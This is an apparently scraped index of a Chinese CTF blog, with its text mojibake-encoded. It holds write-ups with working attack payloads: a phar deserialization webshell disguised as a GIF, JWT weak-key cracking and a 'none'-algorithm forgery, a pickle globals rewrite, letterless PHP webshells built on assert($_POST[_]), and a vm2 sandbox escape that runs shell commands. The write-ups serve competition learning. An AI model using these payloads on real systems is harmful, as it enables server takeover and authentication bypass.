ï¼Œåªèƒ½ä¸Šä¼ å›¾ç‰‡ï¼Œå¹¶ä¸”æœ‰ä¸ª vulnerable.php \u003c?php highlight_file(__FILE__); if (isset($_GET['filename'])) { $filename = $_GET['filename']; } else { $filename = \"\"; } class Flag { private $code; function __destruct() { // TODO: Implement __destruct() method. eval($this-\u003ecode); } } if (file_exists($filename)) { echo \"æ–‡ä»¶å­˜åœ¨çš„å‘¢;\"; } else { echo \"å•Šè¿™ï¼Œæ–‡ä»¶ä¸åœ¨å“¦\"; } ?\u003e é¢˜ååŠ äº†ä¸ªé—®å·ï¼Œé‚£å°±ä¸æ˜¯ååºåˆ—åŒ–ï¼Œä½†æ˜¯è¿˜ä¸çŸ¥é“æ€ä¹ˆåš çœ‹äº†å®˜æ–¹ WPï¼Œè¿™çœŸçš„æ¶‰åŠåˆ°æˆ‘çš„çŸ¥è¯†ç›²åŒºäº† vulnerable.php ä¸­ç”¨åˆ°äº† file_exists å‡½æ•° è‡ª PHP 5.0.0 èµ·, æ­¤å‡½æ•°ä¹Ÿç”¨äºæŸäº› URL åŒ…è£…å™¨ file_existså‡½æ•°åœ¨æ£€æŸ¥ phar åŒ…çš„æ—¶å€™ä¼šå°†å…¶è§£æ ç”¨å¦‚ä¸‹ payload ç”Ÿæˆ phar åŒ… \u003c?php class Flag { private $code; function __construct($my_code) { $this-\u003ecode = $my_code; } function __destruct() { eval($this-\u003ecode); } } $phar = new Phar('a.phar'); $phar-\u003estartBuffering(); $phar-\u003esetStub('GIF89a\u003c?php __HALT_COMPILER();?\u003e'); $object = new Flag('eval($_REQUEST[\"cmd\"]);'); $phar-\u003esetMetadata($object); $phar-\u003eaddFromString('a.txt', 'a'); $phar-\u003estopBuffering(); æ³¨æ„æ·»åŠ æ–‡ä»¶å¤´ç»•è¿‡æ–‡ä»¶ç±»å‹æ£€æµ‹ï¼Œç”Ÿæˆåæ”¹åç¼€ä¸º gif ä¸Šä¼ ï¼Œå†ç”¨ phar åè®®è¯»å–å³å¯ vulnerable.php?filename=phar://upload/a.gif ","date":"2020-05-27","objectID":"/posts/geekgame2020/:3:0","tags":["WriteUp"],"title":"GeekGame 2020 WEB å¤ç°","uri":"/posts/geekgame2020/"},{"categories":["CTF"],"content":"ezcode ç›´åˆ°æ¯”èµ›ç»“æŸåªæœ‰ä¸€è§£çš„é¢˜ æ‰“å¼€å¯ä»¥æ³¨å†Œå’Œç™»å½•ï¼Œæ³¨å†Œè¿”å›ä¸€ä¸² JWTï¼Œåˆšå¼€å§‹æ¯«æ— æ€è·¯ï¼Œåæ¥ç»™äº†ä¸€ä¸ª hint hint ï¼štop1000 ï¼Ÿtop1000 å¼±å£ä»¤å— è·‘äº†ä¸€ä¸‹æœç„¶è·‘å‡ºæ¥äº† key import jwt token = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IjEyMzQifQ.f_U2qBN5qFbsWyIQhfIGYw2aDzX1QTKefGn-QuZ8FIw' with open('top1000.txt', 'r') as f: top1000 = [i.strip() for i in f.readlines()] for i in top1000: test_token = jwt.encode({'username':'1234'}, algorithm='HS256', key=i).decode() if test_token == token: print('Found it!') print(i) print(jwt.encode({'username':'admin'}, algorithm='HS256', key=i).decode()) break çˆ†ç ´ JWT Key å¹¶ä¿®æ”¹å†…å®¹JWT \" çˆ†ç ´ JWT Key å¹¶ä¿®æ”¹å†…å®¹ ç”¨ç”Ÿæˆçš„ JWT ç™»å½•å‘ç°è¿˜æœ‰ç¬¬äºŒå…³ï¼Œçœ‹ä¸€ä¸‹æºç æœ‰æ³¨é‡Š want2know=xxx class RestrictedUnpickler(pickle.Unpickler): blacklist = { 'sys','eval', 'exec', 'execfile', 'compile', 'open', 'input', '__import__', 'exit','getattr' } def find_class(self, module, name): # Only allow safe classes from builtins. if module == \"builtins\" and name not in self.blacklist: return getattr(builtins, name) # Forbid everything else. raise pickle.UnpicklingError(\"global '%s.%s' is forbidden\" % (module, name)) def restricted_loads(s): return RestrictedUnpickler(io.BytesIO(s)).load() ... pickle_data=request.form.get('data') if pickle_data==None: return open('templates/pickle.html').read() try: pickle_data=base64.b64decode(pickle_data.encode()) op_blackli=[b'R'] for op in op_blackli: if op in pickle_data: return 'æ•°æ®éæ³•ï¼'+op.decode() data=restricted_loads(pickle_data) except Exception: return \"è¯·è¾“å…¥æ­£ç¡®çš„æ•°æ®æ ¼å¼ï¼\" try: secret=request.form.get('secret') except Exception: return open('templates/pickle.html') if want2know==secret: return flag else: return 'æ¬¢è¿ä½¿ç”¨HACHp1çš„pickleæµ‹è¯•å·¥å…·ï¼' else: return 'æ²¡æœ‰æƒé™æŸ¥çœ‹ï¼\\n' æ˜¯ä¸€ä¸ª pickle ååºåˆ—åŒ–ï¼Œåªçœ‹å‡ºæ¥ç¦æ­¢ç”¨ R æ‰§è¡Œå‡½æ•°ï¼Œç„¶åå°±ä¸ä¼šäº†ï¼ˆ çœ‹äº† WP è¿™é‡Œæ˜¯åˆ©ç”¨ globals æˆ– locals å‡½æ•°ç›´æ¥ä¿®æ”¹ want2know ä½¿å…¶ä¸è¾“å…¥çš„ secret ç›¸ç­‰ å‡ºé¢˜å£¬æ¨èç”¨ pker æ„å»ºåºåˆ—åŒ– glo_dic=INST('builtins','globals') glo_dic['want2know']='test' return ç”Ÿæˆ payload b\"(ibuiltins\\nglobals\\np0\\n0g0\\nS'want2know'\\nS'test'\\ns.\" base64 ä¸€ä¸‹å³å¯ ","date":"2020-05-27","objectID":"/posts/geekgame2020/:4:0","tags":["WriteUp"],"title":"GeekGame 2020 WEB å¤ç°","uri":"/posts/geekgame2020/"},{"categories":["CTF"],"content":"æ€»ç»“ ç¬¬ä¸€é“ WEB æ¯”è¾ƒç…§é¡¾æˆ‘è¿™æ ·çš„èœğŸ¶ åä¸¤é“ WEB è´¨é‡è¿˜æ˜¯ä¸é”™çš„ï¼Œéƒ½æ¶‰åŠåˆ°äº†æˆ‘ä¸ä¼šçš„çŸ¥è¯†ç‚¹ phar å’Œ pickle ä¼¼ä¹éƒ½æ˜¯ç¬¬ä¸€æ¬¡åšåˆ° é™¤äº†åšä¸å‡ºæ¥ï¼Œä½“éªŒæŒºä¸é”™çš„ï¼ˆ ","date":"2020-05-27","objectID":"/posts/geekgame2020/:5:0","tags":["WriteUp"],"title":"GeekGame 2020 WEB å¤ç°","uri":"/posts/geekgame2020/"},{"categories":["æ‚äº‹"],"content":"åœ¨åšé¢˜çš„æ—¶å€™é‡åˆ°äº†ä¸Šä¼ äº† shell è„šæœ¬ä½†æ˜¯æ²¡æœ‰æ‰§è¡Œæƒé™çš„æƒ…å†µ æµ‹è¯•è„šæœ¬ æµ‹è¯•è„šæœ¬shell \" æµ‹è¯•è„šæœ¬ æœ¬åœ°æµ‹è¯•ç»“æœ æ²¡æœ‰æ‰§è¡Œæƒé™denied \" æ²¡æœ‰æ‰§è¡Œæƒé™ ç„¶åå°±å‘ç°äº† source å‘½ä»¤ ä½¿ç”¨ source å‘½ä»¤source \" ä½¿ç”¨ source å‘½ä»¤ ç‚¹å‘½ä»¤ï¼ˆé”™è¯¯ç¤ºèŒƒï¼‰ ç‚¹å‘½ä»¤çš„é”™è¯¯ç”¨æ³•dot_error \" ç‚¹å‘½ä»¤çš„é”™è¯¯ç”¨æ³• ç‚¹å‘½ä»¤ï¼ˆå¿…é¡»åŠ  ./ï¼‰ æ­£ç¡®ä½¿ç”¨ç‚¹å‘½ä»¤dot \" æ­£ç¡®ä½¿ç”¨ç‚¹å‘½ä»¤ source å‘½ä»¤å’Œç‚¹å‘½ä»¤åœ¨ä½œç”¨ä¸Šå®Œå…¨ç›¸åŒ è€Œé™¤äº†å¯ä»¥ä¸éœ€è¦æ‰§è¡Œæƒé™å¤–ï¼Œsource å‘½ä»¤ï¼ˆç‚¹å‘½ä»¤ï¼‰è¿˜æœ‰ä¸€ä¸ªç‰¹æ€§ï¼Œå³ source å‘½ä»¤æ˜¯åœ¨æœ¬ shell å†…æ‰§è¡Œï¼Œè€Œ ç›´æ¥æ‰§è¡Œè„šæœ¬æ˜¯åœ¨æ–°å¼€ shell ä¸­æ‰§è¡Œï¼Œå³ source å‘½ä»¤å¯ä»¥è®¾ç½®å½“å‰ shell çš„ç¯å¢ƒå˜é‡ï¼Œæ•…å¸¸ç”¨æ¥ä½¿ä¿®æ”¹è¿‡çš„åˆå§‹åŒ–æ–‡ä»¶ï¼ˆ.bashrc .profile ç­‰ï¼‰ç«‹å³ç”Ÿæ•ˆ æµ‹è¯•è„šæœ¬ ç¯å¢ƒå˜é‡æµ‹è¯•è„šæœ¬env \" ç¯å¢ƒå˜é‡æµ‹è¯•è„šæœ¬ ç›´æ¥æ‰§è¡Œ ç›´æ¥æ‰§è¡Œenv_shell \" ç›´æ¥æ‰§è¡Œ source å‘½ä»¤ ä½¿ç”¨ source å‘½ä»¤æ‰§è¡Œenv_source \" ä½¿ç”¨ source å‘½ä»¤æ‰§è¡Œ ç‚¹å‘½ä»¤ ä½¿ç”¨ç‚¹å‘½ä»¤æ‰§è¡Œenv_dot \" ä½¿ç”¨ç‚¹å‘½ä»¤æ‰§è¡Œ ","date":"2020-05-10","objectID":"/posts/source-command/:0:0","tags":["Linux"],"title":"Linux ä¸­çš„ source å‘½ä»¤ï¼ˆç‚¹å‘½ä»¤ï¼‰","uri":"/posts/source-command/"},{"categories":["WEB"],"content":"0x00 å‰è¨€ åˆæ˜¯å¥½å¤šå¤©æ²¡å†™åšå®¢äº†ï¼Œå°±æƒ³ç€å†æ¥éšä¾¿æ°´ç‚¹ä»€ä¹ˆå§ è¿™ç§ç¥å¥‡çš„é¢˜æ›¾ç»åœ¨ CNSS Recruit 2019 Web Bossé¢˜ ä¸­å‡ºç°è¿‡ï¼Œæœ€è¿‘åšé¢˜åˆé‡åˆ°äº†ä¸€æ¬¡ç»“æœè¿˜æ˜¯ä¸ä¼šï¼ˆå› ä¸ºåˆå¤šè¿‡æ»¤äº†ä¸€äº›ç¬¦å·ä¹‹å‰çš„æ–¹æ³•å°±ä¹Ÿä¸èƒ½ç”¨äº†ï¼‰ï¼Œå°±æŠŠå®ƒå†™ä¸‹æ¥å§ï¼Œå…·ä½“æ–¹æ³•æœ‰ä¸‰ç§ï¼Œå¯ä»¥çµæ´»ä½¿ç”¨ï¼Œè¿™é‡Œä½¿ç”¨çš„æ˜¯ PHP5.6 ç¯å¢ƒï¼Œå…·ä½“åŸå› ä¼šåœ¨ä¸‹æ–‡è¯´æ˜ï¼Œæºç å¦‚ä¸‹ \u003c?php highlight_file(__FILE__); if(!preg_match('/[a-z0-9]/is',$_GET['code'])) { eval($_GET['code']); } else { die(\"nonono!\"); } ","date":"2020-05-03","objectID":"/posts/php-webshell-without-alpha-and-num/:1:0","tags":["WEBå®‰å…¨","PHP"],"title":"PHP ä¸­ä¸åŒ…å«å­—æ¯å’Œæ•°å­—çš„ webshell","uri":"/posts/php-webshell-without-alpha-and-num/"},{"categories":["WEB"],"content":"0x01 å‰ç½®çŸ¥è¯†ï¼ˆPHP ä¸­çš„ä¸€äº›ç‰¹æ€§ï¼‰ å¯å˜å‡½æ•°ï¼Œå³å¯ä»¥ç”¨å­—ç¬¦ä¸²å˜é‡å……å½“å‡½æ•°åï¼ˆeval ç­‰è¯­è¨€ç»“æ„ä¸å¯ä½¿ç”¨ï¼‰ å¦‚æœä¸€ä¸ªå˜é‡ååæœ‰åœ†æ‹¬å·ï¼ŒPHP å°†å¯»æ‰¾ä¸å˜é‡çš„å€¼åŒåçš„å‡½æ•°ï¼Œå¹¶ä¸”å°è¯•æ‰§è¡Œå®ƒ \u003c?php $a = 'strrev'; $b = 'Hello'; echo $a($b); // olleH å¯å˜å˜é‡ï¼Œå³åœ¨ä¸€ä¸ªå­—ç¬¦ä¸²å˜é‡å‰å†åŠ ä¸€ä¸ª $ å¯å°†è¯¥å˜é‡çš„å€¼å½“ä½œå˜é‡å ä¸€ä¸ªå¯å˜å˜é‡å¯ä»¥è·å–ä¸€ä¸ªæ™®é€šå˜é‡çš„å€¼ä½œä¸ºè¿™ä¸ªå¯å˜å˜é‡çš„å˜é‡å \u003c?php $a = 'hello'; $$a = 'world'; echo $hello; // world $hello = 'dlrow'; echo $$a; // dlrow ","date":"2020-05-03","objectID":"/posts/php-webshell-without-alpha-and-num/:2:0","tags":["WEBå®‰å…¨","PHP"],"title":"PHP ä¸­ä¸åŒ…å«å­—æ¯å’Œæ•°å­—çš„ webshell","uri":"/posts/php-webshell-without-alpha-and-num/"},{"categories":["WEB"],"content":"0x02 æ€è·¯åˆ†æåŠä¸‰ç§æ–¹æ³• æˆ‘ä»¬éœ€è¦å°†å„ç§ç¬¦å·è¿›è¡Œå˜æ¢ç»„åˆï¼Œæœ€ç»ˆæ„é€ å‡ºå„ç§å­—æ¯æ•°å­—ï¼Œä»¥æ‰§è¡Œæ‰€éœ€å‘½ä»¤ å¤§è‡´æ€è·¯ä¸ºæ„é€  assert($_POST[_]) è·å– shell è¿™é‡Œè¯´ä¸€ä¸‹éœ€è¦ä½¿ç”¨ PHP5 çš„åŸå›  PHP5 ä¸­ assert ä¸ºå‡½æ•°ï¼Œå¯ä»¥é€šè¿‡ $a='assert';$a(...) çš„æ–¹å¼æ‰§è¡Œï¼Œè¿™ä¹Ÿæ˜¯ä¹‹åé€‰ç”¨ assert è€Œä¸é€‰ç”¨ eval çš„åŸå›  PHP7 ä¸­ assert å˜ä¸ºäº†å’Œ eval ä¸€æ ·çš„è¯­è¨€ç»“æ„ï¼Œå³ä¸èƒ½å†ç”¨ä»¥ä¸Šæ–¹æ³•æ‰§è¡Œ åœ¨è¿™ç¯‡æ–‡ç« ç»“å°¾æˆ‘ä¹Ÿä¼šç®€è¦åˆ†æä¸€ä¸‹åœ¨ PHP7 ä¸­æ€ä¹ˆæ“ä½œ ","date":"2020-05-03","objectID":"/posts/php-webshell-without-alpha-and-num/:3:0","tags":["WEBå®‰å…¨","PHP"],"title":"PHP ä¸­ä¸åŒ…å«å­—æ¯å’Œæ•°å­—çš„ webshell","uri":"/posts/php-webshell-without-alpha-and-num/"},{"categories":["WEB"],"content":"æ³•ä¸€ï¼šå¼‚æˆ– å¼‚æˆ–å³ PHP ä¸­çš„è¿ç®—ç¬¦ ^ $a ^ $b Xorï¼ˆæŒ‰ä½å¼‚æˆ–ï¼‰ å°†æŠŠ $a å’Œ $b ä¸­ä¸€ä¸ªä¸º 1 å¦ä¸€ä¸ªä¸º 0 çš„ä½è®¾ä¸º 1 ä¸¤ä¸ªå­—ç¬¦ä¸²å¼‚æˆ–åä»æ˜¯å­—ç¬¦ä¸² è¿™åº”è¯¥æ˜¯è¿™ä¸‰ç§æ–¹æ³•ä¸­æœ€å¸¸ç”¨çš„ä¸€ä¸ªï¼ˆå› ä¸º Google æŸ¥åˆ°æœ€å¤šçš„æ˜¯è¿™ç§æ–¹æ³•ï¼‰ï¼Œå…·ä½“é€‰ç”¨å“ªäº›å­—ç¬¦è¿›è¡Œå¼‚æˆ–ç›´æ¥æŸ¥ ASCII ç è¡¨å°±å¥½ï¼ˆæ„é€ å°å†™å­—æ¯é‡‡ç”¨åå¼•å· ` ï¼Œæ„é€ å¤§å†™å­—æ¯é‡‡ç”¨ @ æ¯”è¾ƒæ–¹ä¾¿ï¼‰ /?code=$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`');$__='_'.('%10'^'@').('%0F'^'@').('%13'^'@').('%14'^'@');$___=$$__;$_($___[_]); æ•´ç†ä¸€ä¸‹å³ä¸ºä»¥ä¸‹ä»£ç  \u003c?php $_ = 'assert'; $__ = '_POST'; $___ = $$__; $_($___[_]); // assert($_POST[_]) ","date":"2020-05-03","objectID":"/posts/php-webshell-without-alpha-and-num/:3:1","tags":["WEBå®‰å…¨","PHP"],"title":"PHP ä¸­ä¸åŒ…å«å­—æ¯å’Œæ•°å­—çš„ webshell","uri":"/posts/php-webshell-without-alpha-and-num/"},{"categories":["WEB"],"content":"æ³•äºŒï¼šå–å å–åå³ PHP ä¸­çš„è¿ç®—ç¬¦ ~ ~$a Notï¼ˆæŒ‰ä½å–åï¼‰ å°† $a ä¸­ä¸º 0 çš„ä½è®¾ä¸º 1ï¼Œåä¹‹äº¦ç„¶ å­—ç¬¦ä¸²å–ååä»æ˜¯å­—ç¬¦ä¸² åœ¨å¼‚æˆ–è¿ç®—ç¬¦ ^ è¢«è¿‡æ»¤æ—¶å¯ä»¥è€ƒè™‘è¿™ç§æ–¹æ³•ï¼Œä¹Ÿæ˜¯æ‹›æ–° BOSS é¢˜ä¸­ç”¨åˆ°çš„æ–¹æ³•ï¼Œä¾ç„¶æŸ¥ ASCII ç è¡¨ /?code=$_=~'%9E%8C%8C%9A%8D%8B';$__=~'%AF%B0%ACAB';$___=$$__;$_($___[_]); æ•´ç†ä¸€ä¸‹å³ä¸ 0x02 ä¸­ä»£ç ç›¸åŒ å¦é™„ä¸€ä¸ªå°†å­—ç¬¦ä¸²è½¬æ¢æˆä¸Šè¿°å–åæ ¼å¼çš„è„šæœ¬ #!/bin/python3 s = 'assert' print(\"~'\", end='') for i in s: i1 = hex(15 - int(hex(ord(i))[-2], 16))[-1].upper() i2 = hex(15 - int(hex(ord(i))[-1], 16))[-1].upper() print('%' + i1 + i2, end='') print(\"'\") # ~'%9E%8C%8C%9A%8D%8B' ","date":"2020-05-03","objectID":"/posts/php-webshell-without-alpha-and-num/:3:2","tags":["WEBå®‰å…¨","PHP"],"title":"PHP ä¸­ä¸åŒ…å«å­—æ¯å’Œæ•°å­—çš„ webshell","uri":"/posts/php-webshell-without-alpha-and-num/"},{"categories":["WEB"],"content":"æ³•ä¸‰ï¼šå­—ç¬¦é€’å¢ é‚£ä¹ˆå¦‚æœå¼‚æˆ–è¿ç®—ç¬¦å’Œå–åè¿ç®—ç¬¦éƒ½è¢«è¿‡æ»¤äº†è¯¥æ€ä¹ˆåŠå‘¢ï¼Œè¿™é‡Œå°±è¦ç”¨åˆ°é€’å¢è¿ç®—ç¬¦ ++ ç„¶è€Œæ€ä¹ˆè·å¾—ç”¨æ¥é€’å¢çš„ç¬¬ä¸€ä¸ªå­—æ¯ï¼Œè¿™ç”¨åˆ°äº† PHP çš„ä¸€ä¸ªç‰¹æ€§ åœ¨è¯•å›¾å°†æ•°ç»„è½¬æ¢æˆå­—ç¬¦ä¸²æ—¶ä¼šè·å¾—å­—ç¬¦ä¸² â€˜Arrayâ€™ å¯ä»¥ç”¨ä»¥ä¸‹ä»£ç æ¼”ç¤ºè¿™ä¸ªç‰¹æ€§ \u003c?php $a = []; $b = \"$a\"; echo $b; // Array åˆç”±äº PHP ä¸­å‡½æ•°åå¯¹å¤§å°å†™ä¸æ•æ„Ÿï¼Œæˆ‘ä»¬å¯ä»¥æ„é€  ASSERT($_POST[_]) /?code=$_=[];$__=\"$_\";$___=$__['@'=='!'];$_=$___;$___%2B%2B;$___%2B%2B;$___%2B%2B;$___%2B%2B;$____=$___;$___%2B%2B;$___%2B%2B;$___%2B%2B;$___%2B%2B;$___%2B%2B;$___%2B%2B;$___%2B%2B;$___%2B%2B;$___%2B%2B;$___%2B%2B;$_____=$___;$___%2B%2B;$______=$___;$___%2B%2B;$___%2B%2B;$_______=$___;$___%2B%2B;$________=$___;$___%2B%2B;$_________=$___;$_=$_.$________.$________.$____.$_______.$_________; $__='_'.$______.$_____.$________.$_________; $___=$$__;$_($___[_]); æ•´ç†å³ä¸ºä»¥ä¸‹ä»£ç  \u003c?php $_ = []; $__ = \"$_\"; // Array $___ = $__['@' == '#']; // A $_ = $___; // A $___++;$___++;$___++;$___++; $____ = $___; // E $___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++; $_____ = $___; // O $___++; $______ = $___; // P $___++;$___++; $_______ = $___; // R $___++; $________ = $___; // S $___++; $_________ = $___; // T $_ = $_.$________.$________.$____.$_______.$_________; // ASSERT $__ = '_'.$______.$_____.$________.$_________; //POST $___ = $$__; $_($___[_]); // assert($_POST[_]) ","date":"2020-05-03","objectID":"/posts/php-webshell-without-alpha-and-num/:3:3","tags":["WEBå®‰å…¨","PHP"],"title":"PHP ä¸­ä¸åŒ…å«å­—æ¯å’Œæ•°å­—çš„ webshell","uri":"/posts/php-webshell-without-alpha-and-num/"},{"categories":["WEB"],"content":"0x03 PHP7 ä¸­å¯ç”¨çš„æ–¹æ³• å¦‚æœ web ç”¨æˆ·æœ‰è¯»å†™æƒé™ï¼Œå¯ä»¥ç›´æ¥ç”¨ file_put_content å‡½æ•°å°†æœ¨é©¬å†™å…¥æ–‡ä»¶ å¦‚æœæ— è¯»å†™æƒé™ï¼Œå¯ä»¥ç”¨ä¸Šè¿°å„ç§æ–¹æ³•æ„é€ å‡ºè‡ªå·±éœ€è¦çš„å‡½æ•°å†æ‰§è¡Œï¼Œæ³•ä¸‰ç»è¿‡ä¸€å®šæ“ä½œç†è®ºä¸Šå¯ä»¥æ„é€ å‡ºæ‰€æœ‰å­—æ¯ï¼ˆå¤§å†™å’Œå°å†™ï¼‰å’Œæ•°å­—ï¼Œå°å†™å­—æ¯å’Œæ•°å­—å¯ä»¥ç”¨ä»¥ä¸‹æ–¹æ³•å†ç»“åˆé€’å¢é€’å‡å³å¯ \u003c?php $_ = []; $__ = \"$_\"; // Array $___ = $__['@' == '#']; // A $_ = $___; // A $___++;$___++;$___++; $____ = $___; // D $___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++; $_____ = $___; // O $___++;$___++;$___++; $______ = $___; // R $_______ = $_____.$______.$____; // ORD $________ = $_______($____) - $_______($_); // 3 ï¼ˆæ•°å­—åœ¨è¿™ï¼‰ $____ = $__[$________]; // a ï¼ˆå°å†™å­—æ¯åœ¨è¿™ï¼‰ ","date":"2020-05-03","objectID":"/posts/php-webshell-without-alpha-and-num/:4:0","tags":["WEBå®‰å…¨","PHP"],"title":"PHP ä¸­ä¸åŒ…å«å­—æ¯å’Œæ•°å­—çš„ webshell","uri":"/posts/php-webshell-without-alpha-and-num/"},{"categories":["WEB"],"content":"0x04 æ€»ç»“ å’•äº†å¥½ä¹…æ‰æƒ³èµ·æ¥æœ‰ç¯‡åšå®¢æ²¡å†™å®Œï¼Œç»“æœè¿™ä¸¤å¤©åˆé‡åˆ°ä¸€æ¬¡ä¾ç„¶ä¸ä¼šï¼ˆå°±æ˜¯ç”¨åˆ°äº†æ³•ä¸‰ï¼‰ï¼Œè·Ÿåœ¨ğŸ™çˆ·çˆ·åé¢åšçœ‹å®Œé¢˜æ‰æƒ³èµ·æ¥ï¼Œå§æ§½è¿™ä¸ªæˆ‘çœ‹è¿‡ï¼ˆä½†æ˜¯è¿˜æ²¡å†™ è¿™ä¸ªæ•…äº‹å‘Šè¯‰æˆ‘ä»¬ï¼Œé¸½å­è¿Ÿæ—©æ˜¯è¦è¢«ç‚–äº†çš„ï¼ˆé€ƒ ","date":"2020-05-03","objectID":"/posts/php-webshell-without-alpha-and-num/:5:0","tags":["WEBå®‰å…¨","PHP"],"title":"PHP ä¸­ä¸åŒ…å«å­—æ¯å’Œæ•°å­—çš„ webshell","uri":"/posts/php-webshell-without-alpha-and-num/"},{"categories":["CTF"],"content":"0x00 å‰è¨€ å½“æ—¶æ¯”èµ›çš„æ—¶å€™ï¼Œä¸€å…±ä¸‰é“ WEB é¢˜ï¼Œä¸¤é“ nodejs çš„éƒ½ä¸ä¼šï¼Œè¿˜æœ‰ä¸€é“ PHP æ²¡æ¥å¾—åŠçœ‹åæ¥çœ‹äº†ä¹Ÿä¸ä¼šï¼ˆè¿˜æ˜¯å¤ªèœäº† è¶é¢˜è¿˜çƒ­ä¹ï¼Œå€Ÿç€ dalao ä»¬çš„ WP å¤ç°ä¸€æ³¢ ","date":"2020-04-22","objectID":"/posts/hfctf-web/:1:0","tags":["WriteUp"],"title":"è™ç¬¦ CTF WEB éƒ¨åˆ†å¤ç°","uri":"/posts/hfctf-web/"},{"categories":["CTF"],"content":"0x01 easy_login ç”±äºé™æ€æ–‡ä»¶çš„é…ç½®é—®é¢˜ï¼Œæœ‰ä¸€å¤§æ³¢æºç æ³„éœ²ï¼ˆæ¯”èµ›æ—¶åªçœ‹åˆ°äº†è¿™ä¸ª åªæœ‰ admin å¯ä»¥çœ‹åˆ° flagï¼Œè€Œæˆ‘ä»¬ä¸èƒ½æ³¨å†Œåä¸º admin çš„ç”¨æˆ·ï¼Œåªèƒ½æƒ³åŠæ³•ä¼ªé€  é¢˜ç›®éƒ½è¯´äº†é”™çš„æ˜¯ä¾èµ–åº“ï¼Œæ¯”èµ›çš„æ—¶å€™å±…ç„¶æ²¡æ³¨æ„åˆ°ï¼Œè¿™é‡Œçš„å…³é”®åœ¨äºç”¨äº† jsonwebtoken åº“ï¼Œé‡ç‚¹åœ¨ç™»å½•çš„ä»£ç  'POST /api/login': async (ctx, next) =\u003e { const {username, password} = ctx.request.body; if(!username || !password) { throw new APIError('login error', 'username or password is necessary'); } const token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization; const sid = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()).secretid; console.log(sid) if(sid === undefined || sid === null || !(sid \u003c global.secrets.length \u0026\u0026 sid \u003e= 0)) { throw new APIError('login error', 'no such secret id'); } const secret = global.secrets[sid]; const user = jwt.verify(token, secret, {algorithm: 'HS256'}); const status = username === user.username \u0026\u0026 password === user.password; if(status) { ctx.session.username = username; } ctx.rest({ status }); await next(); }, é‡ç‚¹åœ¨ jwt åº“å­˜åœ¨ç¼ºé™· å½“åŠ å¯†æ—¶ä½¿ç”¨çš„æ˜¯ none æ–¹æ³•ï¼ŒéªŒè¯æ—¶åªè¦å¯†é’¥å¤„ä¸º undefined æˆ–è€…ç©ºä¹‹ç±»çš„ï¼Œå³ä¾¿åé¢çš„ç®—æ³•æŒ‡åä¸º HS256ï¼ŒéªŒè¯ä¹Ÿè¿˜æ˜¯æŒ‰ç…§ none æ¥éªŒè¯é€šè¿‡ æˆ‘ä»¬åªè¦ä½¿è¿™é‡Œçš„ secret ä¸º undifined æˆ– null å³å¯ï¼Œä½† sid ä¸èƒ½ä¸º undefined æˆ– null æµ‹è¯•å‘ç°ï¼Œå½“æ•°ç»„ç´¢å¼•ä¸ºæµ®ç‚¹æ•°æ—¶ï¼Œå¾—åˆ°çš„ç»“æœä¸º undefined æ•°ç»„ç´¢å¼•ä¸ºæµ®ç‚¹æ•°æ—¶è¿”å› undefinedlist \" æ•°ç»„ç´¢å¼•ä¸ºæµ®ç‚¹æ•°æ—¶è¿”å› undefined å¯ä»¥ç”¨ python æ„é€  token import jwt print(jwt.encode({\"secretid\":0.1,\"username\":\"admin\",\"password\":\"123\"},algorithm=\"none\",key=\"\").decode('utf-8')) å‘é€æ„é€ çš„ token å³å¯ä»¥ admin èº«ä»½ç™»å½•ï¼Œè·å¾— flag ","date":"2020-04-22","objectID":"/posts/hfctf-web/:2:0","tags":["WriteUp"],"title":"è™ç¬¦ CTF WEB éƒ¨åˆ†å¤ç°","uri":"/posts/hfctf-web/"},{"categories":["CTF"],"content":"0x02 just_escape çœ‹èµ·æ¥åç¼€æ˜¯ php å®é™…ä¸Šåç«¯æ˜¯ nodejs code=Error().stack; Error at vm.js:1:1 at Script.runInContext (vm.js:131:20) at VM.run (/app/node_modules/vm2/lib/main.js:219:62) at /app/server.js:51:33 at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5) at next (/app/node_modules/express/lib/router/route.js:137:13) at Route.dispatch (/app/node_modules/express/lib/router/route.js:112:3) at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5) at /app/node_modules/express/lib/router/index.js:281:22 at Function.process_params (/app/node_modules/express/lib/router/index.js:335:12) å¯ä»¥çœ‹åˆ°æ˜¯ç”¨äº† vmï¼ŒGitHub ä¸Šæœ‰ä¸€ä¸ªé€ƒé€¸çš„ payload ä½†æ˜¯è¿™é‡Œè¿‡æ»¤äº†ä¸€äº›å…³é”®å­— for while process exec eval constructor prototype Function + \" ' æ ¹æ® cg çš„ payloadï¼Œå¼•å·å¯ä»¥ç”¨ String.fromCharCode ç»•è¿‡ è¿™é‡Œç»™ä¸€ä¸ªè½¬æˆè¿™ä¸ªå‡½æ•°å½¢å¼çš„è„šæœ¬ s = \"return process\" payload = \"String.fromCharCode(\" for c in s: payload += str(ord(c)) + ',' payload = payload.strip(',') + ')' print(payload) è¿™é‡Œè¢«è¿‡æ»¤çš„æ–¹æ³•åå¯ä»¥ç”¨ JavaScript çš„å¦ä¸€ç§æ–¹æ³•è°ƒç”¨å½¢å¼ï¼Œå³å°†æ–¹æ³•åå½“ä½œæ•°ç»„ç´¢å¼•çš„å½¢å¼åŠ ä¸Š String.fromCharCode ç»•è¿‡ ç»•è¿‡å¼•å·å’Œæ–¹æ³•åè¿‡æ»¤bypass \" ç»•è¿‡å¼•å·å’Œæ–¹æ³•åè¿‡æ»¤ æœ€ç»ˆ paylaod å¦‚ä¸‹ (function(){try{Buffer.from(new Proxy({},{getOwnPropertyDescriptor(){throw f=\u003ef[String.fromCharCode(99,111,110,115,116,114,117,99,116,111,114)](String.fromCharCode(114,101,116,117,114,110,32,112,114,111,99,101,115,115))();}}));}catch(e){return e(()=\u003e{}).mainModule.require(String.fromCharCode(99,104,105,108,100,95,112,114,111,99,101,115,115))[String.fromCharCode(101,120,101,99,83,121,110,99)](String.fromCharCode(99,97,116,32,47,102,108,97,103)).toString();}})() æˆåŠŸè·å¾— flag ","date":"2020-04-22","objectID":"/posts/hfctf-web/:3:0","tags":["WriteUp"],"title":"è™ç¬¦ CTF WEB 